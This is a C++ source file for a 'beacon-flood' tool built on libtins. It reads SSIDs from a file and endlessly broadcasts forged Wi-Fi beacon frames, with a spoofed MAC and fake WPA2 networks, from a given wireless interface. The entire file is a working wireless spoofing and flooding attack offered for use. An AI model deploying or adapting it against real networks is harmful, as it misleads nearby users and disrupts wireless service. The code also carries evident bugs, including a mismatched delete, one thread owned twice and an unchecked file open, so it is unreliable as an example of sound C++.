#include <thread>
#include <vector>
#include <cstdint>
#include <tins/tins.h>
#include <stdio.h>

using namespace std;
using namespace Tins;

template <typename Type>
class MgtFrame {
	Type mac;
	unique_ptr< char > ssid;
	uint32_t channel;

public:

	MgtFrame(Type mac, const char *ssid, uint32_t channel) : mac(mac), channel(channel) {
		size_t ssidlen = strlen(ssid);
		this->ssid = unique_ptr< char >(new char[ssidlen + 1]);
		strncpy(this->ssid.get(), ssid, ssidlen);
		this->ssid.get()[ssidlen] = 0 ;
    }

	Type getMac() const { return mac; }
	char *getSsid() const { return ssid.get(); }
	uint32_t getChannel() const { return channel; }
};

template <typename Type>
thread *BeaconFlooding(const char *dev, MgtFrame<Type> *frame, uint32_t cnt);

template <typename Type>
void BeaconFloodingR(const char *dev, MgtFrame<Type> *frame, uint32_t cnt);

int main(int argc, char *argv[]){
	if(argc < 3)
    {
        printf("sudo ./beacon-flood <interface> <ssid_list_file>\n");
        exit(-1);
    }

    char ssid_list[10][100];
	
    FILE* f = fopen(argv[2], "r");
    int number = 0;

    while(!feof(f) && number < 10)
    {
        fgets(ssid_list[number], sizeof(ssid_list[number]), f);
        printf("%s", ssid_list[number]);
        number++;
    }
    fclose(f);

	vector< shared_ptr<thread> > vthread;
	thread *th;
    
    MgtFrame<Dot11Beacon::address_type> beacon[] = {
        {"10:11:12:13:14:15", ssid_list[0], 1},{"10:11:12:13:14:15", ssid_list[0], 1},{"10:11:12:13:14:15", ssid_list[0], 1},{"10:11:12:13:14:15", ssid_list[0], 1},{"10:11:12:13:14:15", ssid_list[0], 1},{"10:11:12:13:14:15", ssid_list[0], 1},{"10:11:12:13:14:15", ssid_list[0], 1},{"10:11:12:13:14:15", ssid_list[0], 1},{"10:11:12:13:14:15", ssid_list[0], 1},{"10:11:12:13:14:15", ssid_list[0], 1}
    };

    for(int i=0; i<number; ++i) {
        beacon[i] = {"10:11:12:13:14:15", ssid_list[i], i+1};
    }

    th = BeaconFlooding(argv[1], beacon, sizeof(beacon) / sizeof(MgtFrame<Dot11Beacon::address_type>));
    vthread.push_back(shared_ptr<thread>(th));
    vthread.push_back(shared_ptr<thread>(th));

	for(auto item : vthread){
		item->join();
	}

    printf("Press any key to exit\n");
    getchar();


	return 0;
}

template<typename Type>
thread *BeaconFlooding(const char *dev, MgtFrame<Type> *frame, uint32_t cnt){
	return new thread(&BeaconFloodingR<Type>, dev, frame, cnt);
}

template<typename Type>
void BeaconFloodingR(const char *dev, MgtFrame<Type> *frame, uint32_t cnt){
	while(true){
		for(uint32_t i = 0; i < cnt; i++){
			Dot11Beacon beacon;

			beacon.addr1(Dot11::BROADCAST);
			beacon.addr2(frame[i].getMac());
			beacon.addr3(beacon.addr2());

			beacon.ssid(frame[i].getSsid());
			beacon.ds_parameter_set(frame[i].getChannel());
			beacon.supported_rates({ 1.0f, 5.5f, 11.0f });

			beacon.rsn_information(RSNInformation::wpa2_psk());

			PacketSender sender;
			RadioTap packet = RadioTap() / beacon;

			sender.send(packet, dev);
		}
	}
}
